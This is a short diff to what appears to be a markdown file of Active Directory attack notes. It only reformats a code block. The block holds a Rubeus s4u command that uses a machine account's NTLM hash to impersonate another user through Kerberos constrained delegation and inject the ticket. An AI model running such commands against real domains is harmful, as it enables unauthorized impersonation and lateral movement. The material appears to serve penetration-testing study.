@@ -760,7 +760,9 @@ We could also just do it all in one command - Rubeus does all the steps for us!
 
 _in possession of constrained delegation machine account NTLM hash:_
 
-```Rubeus.exe s4u /user:WEBSRV01$ /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:SQLDatabase /ptt```
+```
+Rubeus.exe s4u /user:WEBSRV01$ /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:SQLDatabase /ptt
+```
 
 
 
